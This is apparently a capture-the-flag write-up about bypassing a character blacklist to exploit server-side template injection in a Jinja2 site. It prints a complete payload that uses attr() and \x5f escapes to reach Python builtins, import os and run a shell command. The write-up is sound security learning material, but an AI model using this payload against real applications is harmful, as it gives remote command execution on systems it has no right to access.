Description:  
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)  
Hints:  
Server Side Template Injection  
Why is blacklisting characters a bad idea to sanitize input?  

This one is the combine between "3v@l" and "SST1" challenge. After so many tried, i found out it's using `Jinja2` and blocking some character likes : `.` `_`  ...    
Really hard to write a python payload that does not containts this character.  
Do some research and i found that, we can replace `.` with `attr()` and `_` with `\x5f` ( escape string ).  
The full payload to get the flag is: 
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
```
Peace!


